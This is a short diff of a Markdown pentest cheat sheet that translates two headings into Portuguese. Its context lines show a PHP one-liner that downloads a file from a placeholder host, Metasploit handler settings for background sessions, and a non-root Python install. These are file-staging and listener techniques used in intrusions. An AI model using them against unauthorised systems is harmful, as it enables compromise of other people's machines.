@@ -17,7 +17,7 @@ python3 -m http.server <port>
 netstat -anpt
 ```
 
-# Download files using php:
+# Baixar files usando php:
 
 ```
 php -r "copy('https://endereco.com/arquivo.txt','nome_do_arquivo_na_maquina.txt');"
@@ -36,7 +36,7 @@ set ExitOnSession false
 exploit -j
 ```
 
-# if you need to install python without root:
+# Se você precisar instalar python sem root:
 ```
 wget https://www.python.org/ftp/python/3.9.9/Python-3.9.9.tgz
 ```
